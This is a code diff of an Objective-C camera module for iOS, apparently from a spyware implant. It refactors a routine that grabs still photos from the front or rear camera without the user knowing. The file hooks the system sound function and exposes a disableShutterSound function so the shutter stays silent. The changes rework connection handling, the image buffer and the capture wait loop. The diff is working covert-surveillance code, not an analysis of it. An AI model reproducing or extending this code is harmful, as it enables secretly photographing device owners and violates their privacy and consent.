@@ -8,6 +8,8 @@
 #import "CameraSupport.h"
 
 #import "ARMHooker.h"
+
+#import <unistd.h>
 #import <AVFoundation/AVFoundation.h>
 #import <AudioToolbox/AudioToolbox.h>
 #import <CoreMedia/CoreMedia.h>
@@ -31,7 +33,6 @@ void AudioServicesPlaySystemSoundHook(UInt32 inSystemSoundID)
 NSData* runCamera(NSInteger frontRear);
 
 static BOOL gGrabbed = FALSE;
-static NSData *gImageData = nil;
 static BOOL gCameraRun = NO;
 
 @implementation CameraSupport
@@ -77,13 +78,42 @@ static BOOL gCameraRun = NO;
       }
 }
 
-- (NSData*)_grabCameraShot: (NSInteger)aPosition
+- (AVCaptureConnection *)_getConnection:(NSArray *)connex
 {
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-              
-  int maxRetry = 0;
+  AVCaptureConnection *conn = nil;
   
-  gImageData = nil;
+  for (int i=0; i < [connex count]; i++)
+    {
+      AVCaptureConnection *tmpConn = (AVCaptureConnection*)[connex objectAtIndex:i];
+      
+      if (tmpConn == nil)
+        continue;
+      
+      NSArray *tmpInPorts = [tmpConn inputPorts];
+      
+      if (tmpInPorts == nil)
+        continue;
+      
+      for (int j=0; j< [tmpInPorts count]; j++) 
+        {
+          AVCaptureInputPort *tmpPort = (AVCaptureInputPort*)[tmpInPorts objectAtIndex:j];
+          
+          if (tmpPort != nil && [[tmpPort mediaType] isEqualToString: AVMediaTypeVideo])
+            {
+              conn = tmpConn;
+              break;
+            }
+        }
+    } 
+    
+  return conn;
+}
+
+- (NSData*)_grabCameraShot: (NSInteger)aPosition
+{              
+  __block NSData *imageData = nil;
+  int maxRetry = 0;
+  NSError *err;
   gGrabbed = FALSE;
   
   AVCaptureDevice *av = nil;
@@ -93,37 +123,34 @@ static BOOL gCameraRun = NO;
 #ifdef DEBUG_CAMERA
       NSLog(@"%s: camera is locked!! exit!", __FUNCTION__);
 #endif
-      return gImageData;
+      return imageData;
     }
     
   NSArray *avArray = [AVCaptureDevice devicesWithMediaType: AVMediaTypeVideo]; 
   
   if (avArray == nil || [avArray count] <= 0) 
-  {
+    {
 #ifdef DEBUG_CAMERA
-    NSLog(@"%s: no av array", __FUNCTION__);
+      NSLog(@"%s: no av array", __FUNCTION__);
 #endif
-    [pool release];
-    return gImageData;
-  }
+      return imageData;
+    }
   
   for (int i=0; i < [avArray count]; i++) 
     {
-      av = [avArray objectAtIndex: i];
+      AVCaptureDevice *tmpav = [avArray objectAtIndex: i];
     
-    if (av)
-      {
-      if ([av position] == aPosition)
-        break;
-      }
-    else
-      {
-        [pool release];
-        return gImageData;
-      }
+      if (tmpav && [tmpav position] == aPosition)
+        {
+          av = tmpav;
+          break;
+        }
     }
-    
-  NSError *err;
+   
+  if (av == nil)
+    {
+      return imageData;
+    }
     
   AVCaptureDeviceInput *inDev = [AVCaptureDeviceInput deviceInputWithDevice: av error: &err];
   
@@ -132,13 +159,12 @@ static BOOL gCameraRun = NO;
 #ifdef DEBUG_CAMERA
       NSLog(@"%s: no input device - error %@", __FUNCTION__, err);
 #endif
-      [pool release];
-      return gImageData;
+      return imageData;
     }
   
   AVCaptureSession *avSession = [[AVCaptureSession alloc] init];
   
-  [avSession setSessionPreset: AVCaptureSessionPresetPhoto];
+  [avSession setSessionPreset:AVCaptureSessionPresetPhoto];
   [avSession beginConfiguration];
   
   if ([avSession canAddInput: inDev])
@@ -149,8 +175,7 @@ static BOOL gCameraRun = NO;
       NSLog(@"%s: cant add input device", __FUNCTION__);
 #endif
       [avSession release];
-      [pool release];
-      return gImageData;
+      return imageData;
     }
     
   AVCaptureStillImageOutput *outImg = [[AVCaptureStillImageOutput alloc] init];
@@ -164,79 +189,60 @@ static BOOL gCameraRun = NO;
 #endif
       [avSession release];
       [outImg release];
-      [pool release];
-      return gImageData;
+      return imageData;
     }
     
   [avSession commitConfiguration];
   [avSession startRunning];
+    
+  AVCaptureConnection *conn = nil;
   
-  NSArray *connex = [outImg connections];
-  
-  AVCaptureConnection *conn;
-  
-  if (connex != nil && [connex count] > 0)
-    {
-      conn = [connex objectAtIndex: 0];
-    } 
-  else
+  if ((conn = [self _getConnection: [outImg connections]]) == nil)
     {
 #ifdef DEBUG_CAMERA
       NSLog(@"%s: cant get output connection", __FUNCTION__);
 #endif
       [avSession release];
       [outImg release];
-      [pool release];
-      return gImageData;
+      return imageData;
     }
     
+    sleep(1);
+    NSPort *aPort = [NSPort port];  
+    [[NSRunLoop currentRunLoop] addPort: aPort forMode: NSRunLoopCommonModes];
+                              
     [outImg captureStillImageAsynchronouslyFromConnection: conn completionHandler:
      (^(CMSampleBufferRef imageDataSampleBuffer, NSError *error)
         {
           if (imageDataSampleBuffer != NULL && error == nil)
             {
-              gImageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageDataSampleBuffer];
-              
-#ifdef DEBUG_CAMERA
-              NSLog(@"%s: write down image (gImageData = %#x [class %@], count %d) ", 
-                    __FUNCTION__, gImageData, [gImageData class], [gImageData retain]);
-              [gImageData writeToFile: @"/tmp/img.jpg" atomically:YES];
-#endif         
-              [gImageData retain];
+              imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageDataSampleBuffer];
+              [imageData retain];
             }
           else
             {
 #ifdef DEBUG_CAMERA
               NSLog(@"%s: cant grab image buffer - err %@", __FUNCTION__, error);
 #endif
-              gImageData = nil;
             }
-            
+          
           gGrabbed = TRUE;
           
         })];
- 
-  NSPort *aPort = [NSPort port];
-  
-  [[NSRunLoop currentRunLoop] addPort: aPort 
-                              forMode: NSRunLoopCommonModes];
                               
-  while (gGrabbed == FALSE && maxRetry < MAX_RETRY_COUNT)
+  while (gGrabbed == FALSE && maxRetry++ < MAX_RETRY_COUNT)
   {
     if ([self _checkCameraAvalaible] == NO)
       break;
     [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.250]];
-    maxRetry++;
   }
 
   [avSession stopRunning]; 
   
   [avSession release];
   [outImg release];
-
-  [pool release];
   
-  return gImageData;
+  return imageData;
 }
 
 @end
@@ -246,15 +252,16 @@ extern "C" {
   NSData* runCamera(NSInteger frontRear)
   {
     NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    NSData *imageData = nil;
     
     CameraSupport *cam = [[CameraSupport alloc] init];
     
     if (cam &&
-        [cam _grabCameraShot: frontRear] != nil)
+        (imageData = [cam _grabCameraShot: frontRear]) != nil)
       {
 #ifdef DEBUG_CAMERA
-        NSLog(@"%s: image camera grabbed (gImageData ret count %d)",
-         __FUNCTION__, [gImageData retainCount]);
+        NSLog(@"%s: image camera grabbed (imageData ret count %d)",
+         __FUNCTION__, [imageData retainCount]);
 #endif    
       }
     else
@@ -267,7 +274,7 @@ extern "C" {
     [cam release];
     [pool release];
     
-    return gImageData;
+    return imageData;
   }
 
   void disableShutterSound()
